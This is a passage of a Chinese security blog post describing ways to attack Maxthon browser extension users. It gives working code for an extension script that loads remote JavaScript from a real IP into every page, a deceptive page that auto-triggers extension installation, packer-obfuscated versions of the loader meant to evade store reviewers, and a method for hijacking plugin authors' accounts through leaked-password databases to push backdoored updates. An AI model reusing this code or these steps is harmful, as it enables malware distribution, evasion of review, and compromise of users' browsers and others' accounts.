class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(response &amp;&amp; response.act == <span class="string">'tong'</span>)&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'已安装'</span>);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'未安装'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p><p>既然没有找到，我们就要想其他比较Hack的办法来解决这个问题。</p><p>这里我使用的办法是利用JavaScript全局及setTimeout函数来解决这个问题。</p><p>首先在插件里的base.js文件里写入:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</div><div class="line">script.src = <span class="string">"http://119.29.58.242/control.js"</span>;</div><div class="line"><span class="built_in">document</span>.body.appendChild(script);</div></pre></td></tr></table></figure><p>上面，这段代码将会在每个页面里的body标签后面写入<code>&lt;script src=&quot;http://119.29.58.242/control.js&quot;&gt;&lt;/script&gt;</code>代码，而在<code>http://119.29.58.242/control.js</code>文件里的代码为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">window.plug_setup = function()&#123;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>这时，用户打开任何一个网页，那个网页的全局函数中就会有一个名为plug_setup的函数，并且不具有任何作用，很容易让人忽略掉，只会在特殊的页面中才会起作用。</p><p>然后我们再在网站的页面里写：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span>(plug_setup)!=<span class="string">"function"</span>)&#123;</div><div class="line">        alret(<span class="string">"因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后刷新此页面"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;,<span class="number">1000</span>)</div></pre></td></tr></table></figure></p><p>因为页面加载、网络等问题照成的延迟问题，这里我们设置为1秒后运行检测代码。1秒后，将会运行<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span>(plug_setup)!=<span class="string">"function"</span>)&#123;</div><div class="line">    alret(<span class="string">"因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后刷新此页面"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>这个时候如果全局没有plug_setup函数，将会运行下面的alert函数，告诉用户需要安装插件才可以访问。</p><h6 id="0x1-1-2-欺骗用户进行半自动安装指定插件"><a href="#0x1-1-2-欺骗用户进行半自动安装指定插件" class="headerlink" title="0x1.1.2 欺骗用户进行半自动安装指定插件"></a>0x1.1.2 欺骗用户进行半自动安装指定插件</h6><p>我觉的如果让用户安装插件的话，你跳转到页面，让用户把插件的信息、评论看完再安装，岂不是成功率大大降低了，而且也不符合网站的优化。《点石成金》一书上说过这样一句话“不要让用户思考”，这个虽然是网站设计里面的至理名言，但是也同样可以放在攻击里，当一个用户的思考变得更少时，那么他会有很大程度上会跟着攻击者设计好的路走。</p><p>于是，我分析了遨游浏览器安装插件页面里的JavaScript，发现遨游浏览器进行安装插件时调用API在任何页面都可以运行，会照成攻击者在页面写上一些JavaScript代码后，就会像遨游浏览器那样弹出一个框询问用户是否安装插件：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/1.png" alt=""></p><p>我这里进行一些优化，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div></pre></td><td class="code"><pre><div class="line">var ERRORTEXT = &apos;非傲游浏览器或版本过低。&lt;a href=&quot;http://www.maxthon.cn&quot; target=&quot;_blank&quot;&gt;点此获取最新版本傲游浏览器&lt;/a&gt;&apos;</div><div class="line">function getInstallMessage(that, messagePack, type) &#123;</div><div class="line">    if (external.mxCall) &#123;</div><div class="line">        var packMxAttr = $(that).closest(messagePack);</div><div class="line">        if (type === &apos;skin&apos;) &#123;</div><div class="line">            // 浏览器框架版本号</div><div class="line">            var frameVersion = external.mxCall(&apos;GetSkinFxVersion&apos;);</div><div class="line">        &#125;</div><div class="line">        else if (type === &apos;app&apos;) &#123;</div><div class="line">            // 浏览器框架版本号</div><div class="line">            var frameVersion = external.mxCall(&apos;GetAppFxVersion&apos;);</div><div class="line">            // 下个版本上了就删掉--</div><div class="line">            if (frameVersion === &apos;1.0.0&apos;) &#123;</div><div class="line">                frameVersion = &apos;1.0.1&apos;;</div><div class="line">            &#125;</div><div class="line">            // --下个版本上了就删掉</div><div class="line">        &#125;</div><div class="line">        // 插件包框架版本号</div><div class="line">        var packMxVersion = packMxAttr.attr(&apos;file_def&apos;);</div><div class="line">        // 插件包url</div><div class="line">        var packUrl = packMxAttr.attr(&apos;file_url&apos;);</div><div class="line">        // 插件id</div><div class="line">        var packId = packMxAttr.attr(&apos;file_id&apos;);</div><div class="line">        installPack(frameVersion, packMxVersion, packUrl, type, packId);</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        resultPop.show(&apos;浏览器不符&apos;, ERRORTEXT, &apos;确定&apos;);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">function installPack(frameVersion, packMxVersion, packUrl, type, packId) &#123;</div><div class="line">    var isInstall = returnIsInstall(frameVersion, packMxVersion);</div><div class="line">    if (isInstall !== -1) &#123;</div><div class="line">        if (type === &apos;skin&apos;) &#123;</div><div class="line">            external.mxCall(&apos;InstallSkin&apos;, packUrl);</div><div class="line">        &#125;</div><div class="line">        else if (type === &apos;app&apos;) &#123;</div><div class="line">            external.mxCall(&apos;InstallApp&apos;, packUrl);</div><div class="line">        &#125;</div><div class="line">        getUser(packId);</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        resultPop.show(&apos;浏览器不符&apos;, ERRORTEXT, &apos;确定&apos;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">function returnIsInstall(frameVersion, packMxVersion) &#123;</div><div class="line">    var fvItem;</div><div class="line">    var pvItem;</div><div class="line">    var frameVersion = getVersionArr(frameVersion);</div><div class="line">    var packMxVersion = getVersionArr(packMxVersion);</div><div class="line">    // 定义增长索引值.</div><div class="line">    var i = 0;</div><div class="line">    while (1) &#123;</div><div class="line">        fvItem = frameVersion[i];</div><div class="line">        pvItem = packMxVersion[i];</div><div class="line">        if (fvItem == null &amp;&amp; pvItem == null) &#123;</div><div class="line">            return 0;</div><div class="line">        &#125;</div><div class="line">        if (fvItem == null) &#123;</div><div class="line">            return -1;</div><div class="line">        &#125;</div><div class="line">        if (pvItem == null) &#123;</div><div class="line">            return 1;</div><div class="line">        &#125;</div><div class="line">        if (fvItem != pvItem) &#123;</div><div class="line">            var value = fvItem &gt; pvItem ? 1 : -1</div><div class="line">            return value;</div><div class="line">        &#125;</div><div class="line">        i++;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">function getVersionArr(version) &#123;</div><div class="line">    var versionArr = version.split(&apos;.&apos;);</div><div class="line">    for (var i = 0; i &lt; versionArr.length; i++) &#123;</div><div class="line">        versionArr[i] = parseInt(versionArr[i], 10);</div><div class="line">    &#125;;</div><div class="line">    return versionArr;</div><div class="line">&#125;</div><div class="line">function getUser(id) &#123;</div><div class="line">    $.ajax(&#123;</div><div class="line">        type: &apos;GET&apos;,</div><div class="line">        url: &apos;http://extension.maxthon.cn/common/ajax.php?id=&apos; + id,</div><div class="line">        data: &apos;data&apos;,</div><div class="line">        dataType: &apos;json&apos;,</div><div class="line">        success: function (data) &#123;&#125;,</div><div class="line">        error: function () &#123;&#125;</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line">$(document).delegate(&apos;#app-install&apos;, &apos;click&apos;, function (event) &#123;</div><div class="line">    event.preventDefault();</div><div class="line">    event.stopPropagation();</div><div class="line">    getInstallMessage(this, &apos;a[file_def]&apos;, &apos;app&apos;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p><p>详情可以在<a href="http://extension.maxthon.cn/js/temp.js" target="_blank" rel="external">http://extension.maxthon.cn/js/temp.js</a>里第1256行到1600行查看原始代码。</p><p>此处的代码里的入口处就在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$(document).delegate(&apos;#app-install&apos;, &apos;click&apos;, function (event) &#123;</div><div class="line">    event.preventDefault();</div><div class="line">    event.stopPropagation();</div><div class="line">    getInstallMessage(this, &apos;a[file_def]&apos;, &apos;app&apos;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p><p>当点击id为<code>app-install</code>的DOM时，会先调用<code>getInstallMessage</code>函数，<code>getInstallMessage</code>函数里再调用<code>installPack</code>函数，<code>installPack</code>函数调用<code>returnIsInstall</code>函数和<code>getUser</code>函数，<code>returnIsInstall</code>函数调用了<code>getVersionArr</code>函数。</p><p>最核心的代码在installPack函数里的<code>external.mxCall(&#39;InstallApp&#39;, packUrl);</code>，但是无法直接调用，不然无法安装。而且这里的packUrl必须是<code>http://extension.maxthon.cn</code>下的，不然无法安装，需要事先提交你的插件到遨游插件平台，才可以。</p><p>上面说到当点击id为<code>app-install</code>的DOM时才会触发，我这个人比较懒。就直接copy遨游插件的html代码了，顺便把他隐藏了：<br><code>&lt;a id=&quot;app-install&quot; style=&quot;display:none;&quot; file_def=&quot;1.0.1&quot; file_url=&quot;http://extensiondl.maxthon.cn/skinpack/20062150/1462330643.mxaddon&quot; file_id=&quot;&lt;?echo $view_id;?&gt;&quot;&gt;安装&lt;/a&gt;</code>，这里的file_id为<code>&lt;?echo $view_id;?&gt;</code>估计是遨游的程序员没写好代码，PHP没解析成功，解析成html代码了。但是我懒得改，就这样把。然后我再在他们的后面增加<code>$(&quot;#app-install&quot;).click();</code>代码，让他自动触发</p><p>完整的网站代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</div><div class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</div><div class="line">    &lt;title&gt;欺骗用户安装插件&lt;/title&gt;</div><div class="line">    &lt;script src=&quot;//cdn.bootcss.com/jquery/3.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    欺骗用户安装插件demo1</div><div class="line">    &lt;a id=&quot;app-install&quot; style=&quot;display:none;&quot; file_def=&quot;1.0.1&quot; file_url=&quot;http://extensiondl.maxthon.cn/skinpack/20062150/1462330643.mxaddon&quot; file_id=&quot;&lt;?echo $view_id;?&gt;&quot;&gt;安装&lt;/a&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;script src=&quot;//cdn.bootcss.com/jquery/3.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;script&gt;</div><div class="line">    setTimeout(function()&#123;</div><div class="line">        if(typeof(plug_setup)!=&quot;function&quot;)&#123;</div><div class="line">            alert(&quot;因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后打开此页面&quot;);</div><div class="line">            var ERRORTEXT = &apos;非傲游浏览器或版本过低。&lt;a href=&quot;http://www.maxthon.cn&quot; target=&quot;_blank&quot;&gt;点此获取最新版本傲游浏览器&lt;/a&gt;&apos;</div><div class="line">            function getInstallMessage(that, messagePack, type) &#123;</div><div class="line">                if (external.mxCall) &#123;</div><div class="line">                    var packMxAttr = $(that).closest(messagePack);</div><div class="line">                    if (type === &apos;skin&apos;) &#123;</div><div class="line">                        // 浏览器框架版本号</div><div class="line">                        var frameVersion = external.mxCall(&apos;GetSkinFxVersion&apos;);</div><div class="line">                    &#125;</div><div class="line">                    else if (type === &apos;app&apos;) &#123;</div><div class="line">                        // 浏览器框架版本号</div><div class="line">                        var frameVersion = external.mxCall(&apos;GetAppFxVersion&apos;);</div><div class="line">                        // 下个版本上了就删掉--</div><div class="line">                        if (frameVersion === &apos;1.0.0&apos;) &#123;</div><div class="line">                            frameVersion = &apos;1.0.1&apos;;</div><div class="line">                        &#125;</div><div class="line">                        // --下个版本上了就删掉</div><div class="line">                    &#125;</div><div class="line">                    // 插件包框架版本号</div><div class="line">                    var packMxVersion = packMxAttr.attr(&apos;file_def&apos;);</div><div class="line">                    // 插件包url</div><div class="line">                    var packUrl = packMxAttr.attr(&apos;file_url&apos;);</div><div class="line">                    // 插件id</div><div class="line">                    var packId = packMxAttr.attr(&apos;file_id&apos;);</div><div class="line">                    console.log(frameVersion, packMxVersion, packUrl, type, packId)</div><div class="line">                    installPack(frameVersion, packMxVersion, packUrl, type, packId);</div><div class="line">                &#125;</div><div class="line">                else &#123;</div><div class="line">                    resultPop.show(&apos;浏览器不符&apos;, ERRORTEXT, &apos;确定&apos;);</div><div class="line"></div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            function installPack(frameVersion, packMxVersion, packUrl, type, packId) &#123;</div><div class="line">                var isInstall = returnIsInstall(frameVersion, packMxVersion);</div><div class="line">                if (isInstall !== -1) &#123;</div><div class="line">                    if (type === &apos;skin&apos;) &#123;</div><div class="line">                        external.mxCall(&apos;InstallSkin&apos;, packUrl);</div><div class="line">                    &#125;</div><div class="line">                    else if (type === &apos;app&apos;) &#123;</div><div class="line">                        external.mxCall(&apos;InstallApp&apos;, packUrl);</div><div class="line">                    &#125;</div><div class="line">                    getUser(packId);</div><div class="line">                &#125;</div><div class="line">                else &#123;</div><div class="line">                    resultPop.show(&apos;浏览器不符&apos;, ERRORTEXT, &apos;确定&apos;);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            function returnIsInstall(frameVersion, packMxVersion) &#123;</div><div class="line">                var fvItem;</div><div class="line">                var pvItem;</div><div class="line">                var frameVersion = getVersionArr(frameVersion);</div><div class="line">                var packMxVersion = getVersionArr(packMxVersion);</div><div class="line">                // 定义增长索引值.</div><div class="line">                var i = 0;</div><div class="line">                while (1) &#123;</div><div class="line">                    fvItem = frameVersion[i];</div><div class="line">                    pvItem = packMxVersion[i];</div><div class="line">                    if (fvItem == null &amp;&amp; pvItem == null) &#123;</div><div class="line">                        return 0;</div><div class="line">                    &#125;</div><div class="line">                    if (fvItem == null) &#123;</div><div class="line">                        return -1;</div><div class="line">                    &#125;</div><div class="line">                    if (pvItem == null) &#123;</div><div class="line">                        return 1;</div><div class="line">                    &#125;</div><div class="line">                    if (fvItem != pvItem) &#123;</div><div class="line">                        var value = fvItem &gt; pvItem ? 1 : -1</div><div class="line">                        return value;</div><div class="line">                    &#125;</div><div class="line">                    i++;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            function getVersionArr(version) &#123;</div><div class="line">                var versionArr = version.split(&apos;.&apos;);</div><div class="line">                for (var i = 0; i &lt; versionArr.length; i++) &#123;</div><div class="line">                    versionArr[i] = parseInt(versionArr[i], 10);</div><div class="line">                &#125;;</div><div class="line">                return versionArr;</div><div class="line">            &#125;</div><div class="line">            function getUser(id) &#123;</div><div class="line">                $.ajax(&#123;</div><div class="line">                    type: &apos;GET&apos;,</div><div class="line">                    url: &apos;http://extension.maxthon.cn/common/ajax.php?id=&apos; + id,</div><div class="line">                    data: &apos;data&apos;,</div><div class="line">                    dataType: &apos;json&apos;,</div><div class="line">                    success: function (data) &#123;&#125;,</div><div class="line">                    error: function () &#123;&#125;</div><div class="line">                &#125;);</div><div class="line">            &#125;</div><div class="line">            $(document).delegate(&apos;#app-install&apos;, &apos;click&apos;, function (event) &#123;</div><div class="line">                event.preventDefault();</div><div class="line">                event.stopPropagation();</div><div class="line">                getInstallMessage(this, &apos;a[file_def]&apos;, &apos;app&apos;);</div><div class="line">            &#125;);</div><div class="line">            $(&quot;#app-install&quot;).click();</div><div class="line">        &#125;</div><div class="line">    &#125;,1000);</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p><p>打开后的样子:</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/2.png" alt=""></p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/3.png" alt=""></p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/4.png" alt=""></p><p>这处的LOL战绩查询插件是我之前上传的(不要安装)。真正攻击时可以换成不要那么二的名字，比如”网站增强工具”等</p><p>一开始，我还想试试能不能点击劫持，这样就可以在用户不知情的情况下安装插件，但是这个安装程序不是在页面里面的。无法进行劫持，随之放弃。</p><p>这样一来，尽量让用户少思考的网页就做好了。发布，等待用户上钩吧。这个方法可以与APT攻击中的”水坑攻击”进行相结合，以达到针对性某些特殊的群体或个体的攻击方式</p><h5 id="0x1-2-被动等待"><a href="#0x1-2-被动等待" class="headerlink" title="0x1.2 被动等待"></a>0x1.2 被动等待</h5><p>这个办法是属于广撒网，当没有指定性群体或者个人，只是为了单纯的攻击或者研究时使用。</p><p>这里也有一些小技巧，当开发者上传插件时，遨游审核人员会对插件进行审核，如果发现危害用户的代码，将不给予通过，乍一看没什么问题，但是没有后续了。</p><blockquote><p>没有定期自动化扫描插件代码</p><p>而且即使插件是一个小游戏用，都可以在配置文件def.json里申请权限是最高的</p><p>当代码量足够多的时候，开发人员可以把一些危害到用户请求的代码进行加密混编绕过审查人员的眼睛。（调用伟大的人民领袖毛主席的一句话:与规矩斗，其乐无穷。与代码斗其乐无穷。与人斗其乐无穷。）</p><p>可以在插件里调用第三方的JavaScript代码，第三方url可以指向任何域名。没有进行判断URL及js文件是否为可信</p></blockquote><p>利用以上的问题，我们就可以写出一个具有危害到用户插件，且绕过审查人员的眼睛。</p><p>我们可以在插件源码base.js文件里写<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//xxxxx其他多余的代码</span></div><div class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</div><div class="line">script.src = <span class="string">"http://你的域名/javascript文件名.js"</span>;</div><div class="line"><span class="built_in">document</span>.body.appendChild(script);</div><div class="line"><span class="comment">//xxxxx其他多余的代码</span></div></pre></td></tr></table></figure></p><p>如果不放心可可以加密成下面的这种格式:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&apos;&apos;.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return&apos;\\w+&apos;&#125;;c=1;&#125;;while(c--)if(k[c])p=p.replace(new RegExp(&apos;\\b&apos;+e(c)+&apos;\\b&apos;,&apos;g&apos;),k[c]);return p;&#125;(&apos;o 7=[&quot;\\e\\c\\g\\b\\a\\9&quot;,&quot;\\c\\g\\6\\8\\9\\6\\q\\h\\6\\j\\6\\f\\9&quot;,&quot;\\e\\g\\c&quot;,&quot;\\m\\9\\9\\a\\t\\i\\i\\d\\n\\j\\8\\b\\f\\i\\l\\8\\s\\8\\e\\c\\g\\b\\a\\9\\r\\b\\h\\6\\f\\8\\j\\6\\u\\l\\e&quot;,&quot;\\8\\a\\a\\6\\f\\d\\w\\m\\b\\h\\d&quot;,&quot;\\x\\n\\d\\v&quot;];o k=p[7[1]](7[0]);k[7[2]]=7[3];p[7[5]][7[4]](k)&apos;,34,34,&apos;||||||x65|_0|x61|x74|x70|x69|x63|x64|x73|x6E|x72|x6C|x2F|x6D|script|x6A|x68|x6F|var|document|x45|x66|x76|x3A|x2E|x79|x43|x62&apos;.split(&apos;|&apos;),0,&#123;&#125;))</div></pre></td></tr></table></figure></p><p>方法为：先在<a href="https://javascriptobfuscator.com/Javascript-Obfuscator.aspx" target="_blank" rel="external">javascriptobfuscator</a>上把正常的javascript代码加密成:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var _0x67c5=[&quot;\x73\x63\x72\x69\x70\x74&quot;,&quot;\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74&quot;,&quot;\x73\x72\x63&quot;,&quot;\x68\x74\x74\x70\x3A\x2F\x2F\x64\x6F\x6D\x61\x69\x6E\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x66\x69\x6C\x65\x6E\x61\x6D\x65\x2E\x6A\x73&quot;,&quot;\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64&quot;,&quot;\x62\x6F\x64\x79&quot;];var script=document[_0x67c5[1]](_0x67c5[0]);script[_0x67c5[2]]= _0x67c5[3];document[_0x67c5[5]][_0x67c5[4]](script)</div></pre></td></tr></table></figure></p><p>如图：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/5.png" alt=""></p><p>因为这样的代码看起来着实有点可疑…所以再去<a href="http://tool.chinaz.com/js.aspx" target="_blank" rel="external">站长之家</a>加密成常见的加密代码:</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/6.png" alt=""></p><p>嗯，看着正常多了。放在众多代码之中，审查人员也很难找到(也不会用心找的)</p><p>提交后，会在遨游插件的首页显示最近更新的插件，你只需要每个星期随便增加一点代码或者删除一点代码，再更新一下插件，你的插件就会常年存在插件首页，安装人数想不多都难。</p><h5 id="0x1-3-基于社工库控制插件作者的账户"><a href="#0x1-3-基于社工库控制插件作者的账户" class="headerlink" title="0x1.3 基于社工库控制插件作者的账户"></a>0x1.3 基于社工库控制插件作者的账户</h5><p>这个也是我个人来说最喜欢的方式，毕竟不得不承认不劳而获真的好爽啊。</p><p>因为Maxthon更新插件时没有像Chrome那样需要秘钥才可以更新，所以导致这个’逻辑漏洞’’。因为没有验证当前是否为作者本人的机制，才导致这个方法的可行性。</p><p>之前加了maxthon插件的作者群：203339427</p><p>里面大多都是插件的开发人员，拿他们的邮箱、QQ放在社工库里进行查询，得到密码后可以进行尝试登陆。当然因为不确定是作者使用的是哪个邮箱，我们先拿QQ邮箱登录，他会提示账户或密码错误，不知道是账户错误还是密码错误，可以先去<a href="https://my.maxthon.cn/recover.html" target="_blank" rel="external">遨游账户中心-忘记密码</a>先填写QQ邮箱，如果说用户名不存在，我们可以在网上搜索一下这个作者其他的邮箱，再进行测试(我测试的账户里，很多都需要在网上搜索一下其他的邮箱)。因为之前我把这个当做漏洞提交给wooyun了，遨游没什么反应。本来是想登陆其他用户说明的，但是wooyun暂时休整，无法看到我之前的漏洞详情，而当时社到的账户和密码也没有备份，只在wooyun漏洞详情里有，没有办法，所以这里我就以我自己为例：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/7.png" alt=""></p><p>这里有个<code>更新文件</code>，我们这个时候，可以先把文件download本地，在里面的javascript文件里植入我们的后门。再上传上去。就可以控制1000多个用户了。插件二次审核查的更松。</p><p>而且当你打开遨游浏览器时，遨游浏览器会检测你的插件是否为最新的，如果不是最新的，他会在后台静默安装最新的插件。这个时候对我们的帮助特别大。比如我们更新插件后，只需要等待用户重新打开遨游浏览器就可以实现了攻击的效果。</p><p>更新的时候，就这个账户当做自己的账户就行了，然后照着0x1.2代码写上去就没问题了。</p><h5 id="0x1-4-控制插件里调用的第三方javascript代码"><a href="#0x1-4-控制插件里调用的第三方javascript代码" class="headerlink" title="0x1.4 控制插件里调用的第三方javascript代码"></a>0x1.4 控制插件里调用的第三方javascript代码</h5><p>这个方法比较繁琐，有两种方法来获取第三方的javascript，分为两种情况</p><blockquote><p>不具有可视化页面</p><p>具有可视化页面</p></blockquote><h6 id="0x1-4-1-不具有可视化页面"><a href="#0x1-4-1-不具有可视化页面" class="headerlink" title="0x1.4.1 不具有可视化页面"></a>0x1.4.1 不具有可视化页面</h6><p>类似我上面所说的，在插件的<code>def.json</code>配置文件里写上:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">"actions": [&#123;</div><div class="line">    "type": "script",</div><div class="line">    "entryPoints": [</div><div class="line">        "doc_onload"</div><div class="line">    ],</div><div class="line">    "js": [</div><div class="line">        "base.js"</div><div class="line">    ],</div><div class="line">    "include": ["*"],</div><div class="line">    "includeFrames": true</div><div class="line">&#125;]</div></pre></td></tr></table></figure></p><p>然后在base.js文件里写入你要调用的第三方javascript文件：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</div><div class="line">script.src = <span class="string">"http://119.29.58.242/control.js"</span>;</div><div class="line"><span class="built_in">document</span>.body.appendChild(script);</div></pre></td></tr></table></figure></p><p>像这种的话，就需要在把插件download本地，然后使用maxthon官方提供的<a href="http://bbs.maxthon.cn/thread-664-1-1.html" target="_blank" 